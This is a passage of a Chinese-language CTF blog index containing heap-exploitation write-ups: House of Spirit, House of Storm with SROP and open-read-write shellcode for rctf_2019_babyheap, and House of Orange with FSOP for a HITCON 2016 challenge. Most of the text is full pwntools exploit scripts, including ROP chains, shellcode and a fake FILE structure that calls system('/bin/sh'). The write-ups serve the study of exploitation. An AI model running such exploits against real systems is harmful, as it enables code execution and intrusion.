chunk中分配0x300大小的chunk\nadd(13,3,'Chunk_13')\n\n#dbg()\n\n#在申请一个0x400大小的chunk，再制造一个0x100的smallbin的chunk\nadd(2,4,'Chunk_2')\n#申请一个chunk防止合并\nadd(13,4,'Chunk_13')\n\n#dbg()\n\nfree(2)\n\n#dbg()\n\nadd(13,3,'Chunk_13')\nadd(13,3,'Chunk_13')\n\n#dbg()\n\npayload='\\x00'*0x300+p64(0)+p64(0x101)+p64(heap_addr+0x37E0)+p64(heap_addr+0x250+0x10+0x800-0x10)\nedit(2,payload)\n\n#dbg()\n\nadd(3,2,'Chunk_3')\nlg('heap_addr',heap_addr)\n\n#dbg()\n\n#ORW\npop_rdi_ret = libc_base + 0x0000000000026542\npop_rsi_ret = libc_base + 0x0000000000026f9e\npop_rdx_ret = libc_base + 0x000000000012bda6\nfile_name_addr = heap_addr + 0x0000000000004A40 #下一个chunk的mem位置起始位置\nflag_addr = file_name_addr + 0x0000000000000200 #将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容\nROP_chain  = '/flag\\x00\\x00\\x00'\n#open(file_name_addr,0)\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(file_name_addr)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(0)\nROP_chain += p64(libc_base+libc.symbols['open'])\n#read(3,flag_addr,0x40)\n#Read函数的第一个参数文件描述符从0开始累加，\n#程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，\n#这样在程序中，每打开一个文件，文件描述符值从3开始累加。\n#我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件\n#read函数第一个参数是3，就是在这个文件里读取数据。\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(3)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(flag_addr)\nROP_chain += p64(pop_rdx_ret)\nROP_chain += p64(0x40)\nROP_chain += p64(libc_base+libc.symbols['read'])\n#write(1,flag_addr,0x40)\nROP_chain += p64(pop_rdi_ret)\nROP_chain += p64(1)\nROP_chain += p64(pop_rsi_ret)\nROP_chain += p64(flag_addr)\nROP_chain += p64(pop_rdx_ret)\nROP_chain += p64(0x40)\nROP_chain += p64(libc_base+libc.symbols['write'])\n\nadd(4,4,ROP_chain)\n\n#dbg()\n\nleave_ret = libc_base + 0x0000000000058373\nru('Your input: ')\nsl('666')\nru('What do you want to say?')\n#栈迁移\nsl('A'*0x80 + p64(file_name_addr) + p64(leave_ret))\n\n#dbg()\nitr()\n\n","tags":["heap"]},{"title":"House of Spirit","url":"/2023/04/10/House%20of%20Spirit/","content":"该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。\n要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即\nfake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。\nfake chunk 地址需要对齐， MALLOC_ALIGN_MASK\nfake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。\nfake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。\nfake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。\n\n想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测。\n","tags":["House of 系列"]},{"title":"House of Storm + 堆SROP + orw","url":"/2023/04/10/House%20of%20Storm+%E5%A0%86SROP+orw/","content":"同样是house of storm，但是如果程序开启了沙箱，禁用了system函数，那我们常规把hook函数改为system函数的方法就失效了，若是沙箱没有禁用open，read，write函数，这里我们可以考虑用orw。\n例题rctf_2019_babyheap\n保护全开，禁用了execve就是禁用了system，因为system函数通过调用execve函数才能执行。看一下ida\nmain函数可以看到是实现了四个功能，增改删查\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  init(argc, argv, envp);\n  while ( 1 )\n  {\n    menu();\n    switch ( get_int() )\n    {\n      case 1:\n        add();\n        break;\n      case 2:\n        edit();\n        break;\n      case 3:\n        delete();\n        break;\n      case 4:\n        show();\n        break;\n      case 5:\n        puts(\"See you next time!\");\n        exit(0);\n      default:\n        puts(\"Invalid choice!\");\n        break;\n    }\n  }\n}\n\nadd函数可以申请最大0x1000大小的chunk，最多申请16个chunk\nunsigned __int64 add()\n{\n  void **v0; // rbx\n  int i; // [rsp+0h] [rbp-20h]\n  int size; // [rsp+4h] [rbp-1Ch]\n  unsigned __int64 v4; // [rsp+8h] [rbp-18h]\n\n  v4 = __readfsqword(0x28u);\n  for ( i = 0; *(ptrs + 2 * i) &amp;&amp; i &lt;= 15; ++i )\n    ;\n  if ( i == 16 )\n  {\n    puts(\"You can't\");\n    exit(-1);\n  }\n  printf(\"Size: \");\n  size = get_int();\n  if ( size &lt;= 0 || size &gt; 0x1000 )\n  {\n    puts(\"Invalid size :(\");\n  }\n  else\n  {\n    *(ptrs + 4 * i + 2) = size;\n    v0 = (ptrs + 16 * i);\n    *v0 = calloc(size, 1uLL);\n    puts(\"Add success :)\");\n  }\n  return __readfsqword(0x28u) ^ v4;\n}\n\nedit函数存在off-by-null漏洞\nunsigned __int64 edit()\n{\n  unsigned int v1; // [rsp+0h] [rbp-10h]\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  printf(\"Index: \");\n  v1 = get_int();\n  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )\n  {\n    printf(\"Content: \");\n    *(*(ptrs + 2 * v1) + read_n(*(ptrs + 2 * v1), *(ptrs + 4 * v1 + 2))) = 0; //off-by-one\n    puts(\"Edit success :)\");\n  }\n  else\n  {\n    puts(\"Invalid index :(\");\n  }\n  return __readfsqword(0x28u) ^ v2;\n}\n\ndelete函数unsigned __int64 delete()\n{\n  unsigned int v1; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  printf(\"Index: \");\n  v1 = get_int();\n  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )\n  {\n    free(*(ptrs + 2 * v1));\n    *(ptrs + 2 * v1) = 0LL;\n    *(ptrs + 4 * v1 + 2) = 0;\n    puts(\"Delete success :)\");\n  }\n  else\n  {\n    puts(\"Invalid index :(\");\n  }\n  return __readfsqword(0x28u) ^ v2;\n}\n\nshow函数unsigned __int64 show()\n{\n  unsigned int v1; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v2; // [rsp+8h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  printf(\"Index: \");\n  v1 = get_int();\n  if ( v1 &lt;= 0xF &amp;&amp; *(ptrs + 2 * v1) )\n    puts(*(ptrs + 2 * v1));\n  else\n    puts(\"Invalid index :(\");\n  return __readfsqword(0x28u) ^ v2;\n}\n\n思路看了大佬的博客rctf_2019_babyheap，这里对其进行详细的解析。程序禁用了fastbin，且能申请最大为0x1000大小的chuck，可以使用house of storm，修改free_hook的地址为shellcode，执行shellcode，这里我们需要用orw来写shellcode，并且在这之前需要用mprotect函数修改free_hook段为可读可写可执行权限。\n调试过程先把前面的写好\n# coding=utf-8\nfrom pwn import *\n#sh = remote(\"node4.buuoj.cn\", 29278)\nsh = process('./rctf_2019_babyheap')\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\nelf = ELF(\"./rctf_2019_babyheap\")\nlibc = ELF('../../libc-2.23.so--64')\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims   :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg=lambda address,data:log.success('%s: '%(address)+hex(data))\n\n \ndef add(size):\n    ru(\"Choice: \\n\")\n    sl('1')\n    ru(\"Size: \")\n    sl(str(size))\n\ndef free(index):\n    ru(\"Choice: \\n\")\n    sl('3')\n    ru(\"Index: \")\n    sl(str(index))\n\ndef show(index):\n    ru(\"Choice: \\n\")\n    sl('4')\n    ru(\"Index: \")\n    sl(str(index))\n\ndef edit(index, content):\n    ru(\"Choice: \\n\")\n    sl('2')\n    ru(\"Index: \")\n    sl(str(index))\n    ru(\"Content: \")\n    s(content)\n\n首先构造堆块重叠，泄露libc基地址先申请四个chunk，申请的chunk真正大小分别为0x90,0x70,0x100,0x20,chunk_3是为了free前三个chunk后防止堆块合并\nadd(0x80)#0\nadd(0x68)#1\nadd(0xf0)#2\nadd(0x18)#3\ndbg()\n\n之后free chunk_0，此时因为禁用了fastbin，所以chunk_0直接进入了unsortedbin里，再利用off-by-null漏洞修改chunk_2的pre_size为0x100（chunk_0+chunk_1正好就是0x100），修改chunk_2的size为0x100，使他处于free状态。\nfree(0)\npayload = 'a'*0x60 + p64(0x100)\nedit(1, payload)\n\ndbg()\n\nfree chunk_2后，触发堆块前向合并，chunk_2的pre_size为是0x100,chunk_0和chunk_1加起来是0x100，就是前三个chunk合并。unsortedbin里存放着原chunk_0的起始地址。\nfree(2)\n\ndbg()\n\n\n此时chunk_1是没有被free的，然后我们再次申请0x80（原chunk_0大小）大小的chunk，此时原chunk_1的mem区域存放着main_arena+88，因为chunk_1并没有被free，所以我们直接调用show函数即可泄露libc基地址。\nadd(0x80)#0\nshow(1)\nmalloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10\nlibc.address = malloc_hook - libc.sym['__malloc_hook']\nsystem = libc.sym['system']\nfree_hook = libc.sym['__free_hook']\nset_context = libc.symbols['setcontext']\nlg('libc_base',libc.address)\n\ndbg()\n\n\n构造unsortbin chunk 和largebin chunk，进行 house of strom先申请0x160大小的chunk，将unsortbin中残余chunk清空，之后构造unsortbin chunk 和largebin chunk的调试过程请参考我另一篇文章House of storm此时我们已以可以修改free_hook处的值了\n#---------------布置chunk-------------------------#\nadd(0x18)#4\nadd(0x508)#5\nadd(0x18)#6\nadd(0x18)#7\nadd(0x508)#8\nadd(0x18)#9\nadd(0x18)#10\n\n#dbg()\n#----------------准备 unsorted chunk-----------------------#\t\nedit(5, 'a'*0x4f0+p64(0x500))\n\n#dbg()\n\nfree(5)\nedit(4, 'a'*0x18)\n\n#dbg()\n\nadd(0x18)#5\nadd(0x4d8)#11\nfree(5)\nfree(6)\n\n#dbg()\n\nadd(0x30)#5\nadd(0x4e8)#6\n\n#dbg()\n\n#-------------------准备 large chunk-----------------------------------#\nedit(8, 'a'*0x4f0+p64(0x500))\nfree(8)\nedit(7, 'a'*0x18)\nadd(0x18)#8\nadd(0x4d8)#12\nfree(8)\nfree(9)\nadd(0x40)#8\n#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\n\n#dbg()\n\nfree(6)\n\n#dbg()\n\nadd(0x4e8)#6\n\n#dbg()\n\nfree(6)\n\n#dbg()\n\n#pause()\n#--------------修改他们的满足条件进行 house of strom------------------------------#\nstorage = free_hook\nfake_chunk = storage - 0x20\npayload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\nedit(11, payload)\n\n#dbg()\n\npayload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)\nedit(12, payload)\n\n#dbg()\n\nadd(0x48)#6\n\nmprotect+shellcode修改free_hook为set_context+53，free_hook+0x18，free_hook+0x18，shellcode1,setcontext函数负责对各个寄存器进行赋值，甚至可以控制rip，对寄存器进行赋值主要从+53开始，shellcode1即为read(0, new_addr,0x1000)，new_addr即为（free_hook &amp;0xFFFFFFFFFFFFF000）free_hook所在内存页的起始位置。我们将对这里赋予可读可写可执行权限。\nnew_addr =  free_hook &amp;0xFFFFFFFFFFFFF000\nshellcode1 = '''\nxor rdi,rdi\nmov rsi,%d\nmov edx,0x1000\n\nmov eax,0\nsyscall\n\njmp rsi\n''' % new_addr\nedit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\n\n\n修改前修改后\nSROP我们利用pwntools里的SigreturnFrame()执行mprotect(new_addr,0x1000,7)，并将rsp跳转到free_hook+0x10处，即0x00007f05935487c0，之后执行0x00007f05935487c0地址处的代码，即我们刚才写入的shellcode1，执行read(0, new_addr,0x1000)，将我们构造的第二个shellcode写入0x00007f0593548000处 ，并将rip跳转到我们写的第二个shellcode处执行。\nframe = SigreturnFrame()\nframe.rsp = free_hook+0x10\nframe.rdi = new_addr\nframe.rsi = 0x1000\nframe.rdx = 7\nframe.rip = libc.sym['mprotect']\nedit(12, str(frame))\nfree(12)\n\n\nORW利用orw构造shellcode，发送过去并执行，获得shell\nshellcode2 = '''\nmov rax, 0x67616c662f ;// /flag\npush rax\n\nmov rdi, rsp ;// /flag\nmov rsi, 0 ;// O_RDONLY\nxor rdx, rdx ;\nmov rax, 2 ;// SYS_open\nsyscall\n\nmov rdi, rax ;// fd \nmov rsi,rsp  ;\nmov rdx, 1024 ;// nbytes\nmov rax,0 ;// SYS_read\nsyscall\n\nmov rdi, 1 ;// fd \nmov rsi, rsp ;// buf\nmov rdx, rax ;// count \nmov rax, 1 ;// SYS_write\nsyscall\n\nmov rdi, 0 ;// error_code\nmov rax, 60\nsyscall\n'''\nsl(asm(shellcode2))\nitr()\n\n\nexp# coding=utf-8\nfrom pwn import *\n#sh = remote(\"node4.buuoj.cn\", 29278)\nsh = process('./rctf_2019_babyheap')\ncontext(log_level = 'debug', arch = 'amd64', os = 'linux')\nelf = ELF(\"./rctf_2019_babyheap\")\nlibc = ELF('../../libc-2.23.so--64')\ndef dbg():\n        gdb.attach(sh)\n        pause()\n\n#命令简写化\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims   :sh.recvuntil(delims)\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg=lambda address,data:log.success('%s: '%(address)+hex(data))\n\n \ndef add(size):\n    ru(\"Choice: \\n\")\n    sl('1')\n    ru(\"Size: \")\n    sl(str(size))\n\ndef free(index):\n    ru(\"Choice: \\n\")\n    sl('3')\n    ru(\"Index: \")\n    sl(str(index))\n\ndef show(index):\n    ru(\"Choice: \\n\")\n    sl('4')\n    ru(\"Index: \")\n    sl(str(index))\n\ndef edit(index, content):\n    ru(\"Choice: \\n\")\n    sl('2')\n    ru(\"Index: \")\n    sl(str(index))\n    ru(\"Content: \")\n    s(content)\n\ndef pwn():\n \n    add(0x80)#0\n    add(0x68)#1\n    add(0xf0)#2\n    add(0x18)#3\n    \n    #dbg()\n\n    free(0)\n    payload = 'a'*0x60 + p64(0x100)\n    edit(1, payload)\n    \n    #dbg()\n    \n    free(2)\n\n    #dbg()\n\n    add(0x80)#0\n    show(1)\n    malloc_hook = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x58 - 0x10\n    libc.address = malloc_hook - libc.sym['__malloc_hook']\n    system = libc.sym['system']\n    free_hook = libc.sym['__free_hook']\n    set_context = libc.symbols['setcontext']\n    lg('libc_base',libc.address)\n    \n    #dbg()\n    \n    add(0x160)#2\n\n    #dbg()\n    #---------------布置chunk-------------------------#\n    add(0x18)#4\n    add(0x508)#5\n    add(0x18)#6\n    add(0x18)#7\n    add(0x508)#8\n    add(0x18)#9\n    add(0x18)#10\n\n    #dbg()\n    #----------------准备 unsorted chunk-----------------------#\t\n    edit(5, 'a'*0x4f0+p64(0x500))\n\n    #dbg()\n\n    free(5)\n    edit(4, 'a'*0x18)\n    \n    #dbg()\n\n    add(0x18)#5\n    add(0x4d8)#11\n    free(5)\n    free(6)\n    \n    #dbg()\n    \n    add(0x30)#5\n    add(0x4e8)#6\n    \n    #dbg()\n    \n    #-------------------准备 large chunk-----------------------------------#\n    edit(8, 'a'*0x4f0+p64(0x500))\n    free(8)\n    edit(7, 'a'*0x18)\n    add(0x18)#8\n    add(0x4d8)#12\n    free(8)\n    free(9)\n    add(0x40)#8\n    #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#\n    \n    #dbg()\n    \n    free(6)\n    \n    #dbg()\n    \n    add(0x4e8)#6\n    \n    #dbg()\n    \n    free(6)\n\n    #dbg()\n\n    #pause()\n    #--------------修改他们的满足条件进行 house of strom------------------------------#\n    storage = free_hook\n    fake_chunk = storage - 0x20\n    payload = '\\x00'*0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)\n    edit(11, payload)\n\n    #dbg()\n\n    payload = '\\x00'*0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5)\n    edit(12, payload)\n\n    #dbg()\n\n    add(0x48)#6\n    \n    #dbg()\n\n    new_addr =  free_hook &amp;0xFFFFFFFFFFFFF000\n    shellcode1 = '''\n    xor rdi,rdi\n    mov rsi,%d\n    mov edx,0x1000\n\n    mov eax,0\n    syscall\n\n    jmp rsi\n    ''' % new_addr\n    edit(6, 'a'*0x10+p64(set_context+53)+p64(free_hook+0x18)*2+asm(shellcode1))\n\n    #dbg()\n\n    frame = SigreturnFrame()\n    frame.rsp = free_hook+0x10\n    frame.rdi = new_addr\n    frame.rsi = 0x1000\n    frame.rdx = 7\n    frame.rip = libc.sym['mprotect']\n    edit(12, str(frame))\n    free(12)\n    #dbg() \n\n    shellcode2 = '''\n    mov rax, 0x67616c662f ;// /flag\n    push rax\n\n    mov rdi, rsp ;// /flag\n    mov rsi, 0 ;// O_RDONLY\n    xor rdx, rdx ;\n    mov rax, 2 ;// SYS_open\n    syscall\n\n    mov rdi, rax ;// fd \n    mov rsi,rsp  ;\n    mov rdx, 1024 ;// nbytes\n    mov rax,0 ;// SYS_read\n    syscall\n\n    mov rdi, 1 ;// fd \n    mov rsi, rsp ;// buf\n    mov rdx, rax ;// count \n    mov rax, 1 ;// SYS_write\n    syscall\n\n    mov rdi, 0 ;// error_code\n    mov rax, 60\n    syscall\n    '''\n    sl(asm(shellcode2))\n    \n\n    dbg()\n    itr()\n \n \npwn()\n\n","tags":["House of 系列"]},{"title":"House of Orange","url":"/2023/04/10/House%20of%20Orange/","content":"House of orange前提题目中不存在 free 函数或其他释放堆块的函数。\n原理House of Orange 核心就是通过漏洞利用获得 free 的效果。当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。\n利用方法1.篡改top chunk size（注意size需要对齐内存页）\n2.分配比top chunk size大的chunk。\n3.现在原来的top chunk进入了unsorted bin中，再次malloc就会从unsored bin中切分出需要的大小，剩余部分作新的unsorted bin。\n\n注意：伪造top chunk size时，必须满足以下要求1.伪造的size必须要对齐到内存页。\n2.size要大于MINSIZE。\n3.size要小于之后申请的chunk size + MINISIZE。\n4.size的prev inuse位必须为1。\n5.malloc的大小不能大于mmap分配阈值。\n\n例题houseoforange_hitcon_2016保护全开，打开ida\nmain函数void __fastcall __noreturn main(const char *a1, char **a2, char **a3)\n{\n  int choice; // eax\n\n  sub_1218();\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      menu();\n      choice = my_read(a1, a2);\n      if ( choice != 2 )\n        break;\n      show();\n    }\n    if ( choice &gt; 2 )\n    {\n      if ( choice == 3 )\n      {\n        edit();\n      }\n      else\n      {\n        if ( choice == 4 )\n        {\n          puts(\"give up\");\n          exit(0);\n        }\nLABEL_13:\n        a1 = \"Invalid choice\";\n        puts(\"Invalid choice\");\n      }\n    }\n    else\n    {\n      if ( choice != 1 )\n        goto LABEL_13;\n      add();\n    }\n  }\n}\n\nadd函数会申请三个chunk，chunk_1存放chunk_2和chunk_3的mem指针，chunk_2存放name，chunk_3存放price和color。由于num2的限制，只能使用4次add函数。\nint add()\n{\n  unsigned int size; // [rsp+8h] [rbp-18h]\n  int color; // [rsp+Ch] [rbp-14h]\n  _QWORD *v3; // [rsp+10h] [rbp-10h]\n  _DWORD *v4; // [rsp+18h] [rbp-8h]\n\n  if ( num2 &gt; 3u )                              // num开始为0，可利用add4次\n  {\n    puts(\"Too many house\");\n    exit(1);\n  }\n  v3 = malloc(0x10uLL);   //chunk_1\n  printf(\"Length of name :\");\n  size = my_read();\n  if ( size &gt; 0x1000 )\n    size = 0x1000;\n  v3[1] = malloc(size);     //chunk_2\n  if ( !v3[1] )\n  {\n    puts(\"Malloc error !!!\");\n    exit(1);\n  }\n  printf(\"Name :\");\n  my_read2((void *)v3[1], size);\n  v4 = calloc(1uLL, 8uLL);      //chunk_3\n  printf(\"Price of Orange:\");\n  *v4 = my_read();\n  ::color();\n  printf(\"Color of Orange:\");\n  color = my_read();\n  if ( color != 0xDDAA &amp;&amp; (color &lt;= 0 || color &gt; 7) )\n  {\n    puts(\"No such color\");\n    exit(1);\n  }\n  if ( color == 0xDDAA )\n    v4[1] = 0xDDAA;\n  else\n    v4[1] = color + 30;\n  *v3 = v4;\n  heap_array = v3;\n  ++num2;\n  return puts(\"Finish\");\n}\n\nshow函数int sub_EE6()\n{\n  int v0; // eax\n  int v2; // eax\n\n  if ( !heap_array )\n    return puts(\"No such house !\");\n  if ( *(_DWORD *)(*heap_array + 4LL) == 0xDDAA )\n  {\n    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);\n    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);\n    v0 = rand();\n    return printf(\"\\x1B[01;38;5;214m%s\\x1B[0m\\n\", *((const char **)&amp;unk_203080 + v0 % 8));\n  }\n  else\n  {\n    if ( *(int *)(*heap_array + 4LL) &lt;= 30 || *(int *)(*heap_array + 4LL) &gt; 37 )\n    {\n      puts(\"Color corruption!\");\n      exit(1);\n    }\n    printf(\"Name of house : %s\\n\", (const char *)heap_array[1]);\n    printf(\"Price of orange : %d\\n\", *(unsigned int *)*heap_array);\n    v2 = rand();\n    return printf(\"\\x1B[%dm%s\\x1B[0m\\n\", *(unsigned int *)(*heap_array + 4LL), *((const char **)&amp;unk_203080 + v2 % 8));\n  }\n}\n\nedit函数存在漏洞，修改chunk时的size大小由我们自己修改，可造成堆溢出，修改下一个chunk的内容，edit函数有num作为限制，只能使用3次\nint sub_107C()\n{\n  _DWORD *v1; // rbx\n  unsigned int size; // [rsp+8h] [rbp-18h]\n  int v3; // [rsp+Ch] [rbp-14h]\n\n  if ( num &gt; 2u )                               // num开始为0，可利用edit3次\n    return puts(\"You can't upgrade more\");\n  if ( !heap_array )\n    return puts(\"No such house !\");\n  printf(\"Length of name :\");\n  size = my_read();\n  if ( size &gt; 0x1000 )\n    size = 4096;\n  printf(\"Name:\");                              // size由我们输入，存在溢出\n  my_read2((void *)heap_array[1], size);\n  printf(\"Price of Orange: \");\n  v1 = (_DWORD *)*heap_array;\n  *v1 = my_read();\n  color();\n  printf(\"Color of Orange: \");\n  v3 = my_read();\n  if ( v3 != 0xDDAA &amp;&amp; (v3 &lt;= 0 || v3 &gt; 7) )\n  {\n    puts(\"No such color\");\n    exit(1);\n  }\n  if ( v3 == 0xDDAA )\n    *(_DWORD *)(*heap_array + 4LL) = 0xDDAA;\n  else\n    *(_DWORD *)(*heap_array + 4LL) = v3 + 30;\n  ++num;\n  return puts(\"Finish\");\n}\n\n分析程序不存在free函数，而按照我们的一般思路都是先free一个大于0x7f的chunk，进入unsortedbin，获得libc基地址，之后覆盖hook函数为system函数获得shell。而这道题不能这样做，add和edit函数的使用次数也有限制，这道题的edit函数存在堆溢出，可以考虑使用House of orange，通过修改top chunk为一个比较小的值，然后分配一个很大的chunk，使top chunk进入unsortedbin，从而泄露libc，这样heap基地址也能泄露出来，之后的话，可以使用FSOP，获得shell。\n过程先把前面的写好\n# coding=utf-8\nfrom pwn import  *\n \ncontext(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug\n \nbinary = './houseoforange_hitcon_2016'  \n#sh = process(binary) #连接本地程序\nsh = remote('node4.buuoj.cn',26188) #连接远程程序\nelf = ELF(binary)     \nlibc = ELF('../../libc-2.23.so--64')  \n\n#libc-2.23.so--64\none_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]\none_gadget[0] = 0x45216\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims  :sh.recvuntil(delims )\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               :u32(data.ljust(4,'\\0'))\nuu64    = lambda data               :u64(data.ljust(8,'\\0'))\nleak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))\nlg=lambda address,data:log.success('%s: '%(address)+hex(data))\n#定义gdb调试函数\ndef dbg():\n        gdb.attach(sh)\n        pause()\ndef add(size, content, price='2', color='1'):\n    ru(\"Your choice : \")\n    sl('1')\n    ru(\"Length of name :\")\n    sl(str(size))\n    ru(\"Name :\")\n    sh.send(content)\n    ru(\"Price of Orange:\")\n    sl(str(price))\n    ru(\"Color of Orange:\")    #1-7\n    sl(str(color))\n\n\ndef show():\n    ru(\"Your choice : \")\n    sl('2')\n\ndef edit(size, content, price='2', color='1'):\n    ru(\"Your choice : \")\n    sl('3')\n    ru(\"Length of name :\")\n    sl(str(size))\n    ru(\"Name:\")\n    sh.send(content)\n    ru(\"Price of Orange:\")\n    sl(str(price))\n    ru(\"Color of Orange:\")    #1-7\n    sl(str(color))\n\n修改top chunk随便申请一个chunk，然后利用edit函数，溢出修改topchunk\nadd(0x30,'aaaa\\n')\ndbg()\npayload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(2) + p64(0) * 2 + p64(0xf81)\nedit(len(payload), payload)\ndbg()\n\ntop chunk大小为0x0000000000020f81修改后的top chunk 大小为0x0000000000000f81\n申请大于top chunk的chunk，进入unsortedbinadd(0x1000, 'a\\n')\ndbg()\n\n\n泄露libc和heap调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出\nadd(0x400, 'a' * 8)\nshow()\nru('a'*8)\nlibc.address = u64(ru('\\x7f').ljust(8, '\\x00')) - 0x3c5188\nlg('libc.address',libc.address)\nio_list_all = libc.symbols['_IO_list_all']\nsystem = libc.symbols['system']\ndbg()\n\n\n我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址\npayload = 'b' * 0x10\nedit(0x10, payload)\nshow()\nru('b'*0x10)\nheap = u64(sh.recvuntil('\\n').strip().ljust(8, '\\x00'))\nheap_base = heap - 0xE0\nlg('heap_base',heap_base)\ndbg()\n\n\n构造fake_file接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释\nmalloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体\ndbg()\npayload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)\nfake_file = '/bin/sh\\x00'+p64(0x61)#to small bin\nfake_file += p64(0)+p64(io_list_all-0x10)\nfake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr\nfake_file = fake_file.ljust(0xc0,'\\x00')\nfake_file += p64(0) * 3\nfake_file += p64(heap_base+0x5E8) #vtable ptr\nfake_file += p64(0) * 2\nfake_file += p64(system)\npayload += fake_file\nedit(len(payload), payload)\ndbg()\n\n修改前修改后\n之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell\nru(\"Your choice : \")\nsl('1')\nitr()\n\nexp# coding=utf-8\nfrom pwn import  *\n \ncontext(endian='little',os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,debug\n \nbinary = './houseoforange_hitcon_2016'  \n#sh = process(binary) #连接本地程序\nsh = remote('node4.buuoj.cn',26188) #连接远程程序\nelf = ELF(binary)     \nlibc = ELF('../../libc-2.23.so--64')  \n\n#libc-2.23.so--64\none_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]\none_gadget[0] = 0x45216\ns       = lambda data               :sh.send(data)\nsa      = lambda delim,data         :sh.sendafter(delim, data)\nsl      = lambda data               :sh.sendline(data)\nsla     = lambda delim,data         :sh.sendlineafter(delim, data)\nr       = lambda num=4096           :sh.recv(num)\nru      = lambda delims  :sh.recvuntil(delims )\nitr     = lambda                    :sh.interactive()\nuu32    = lambda data               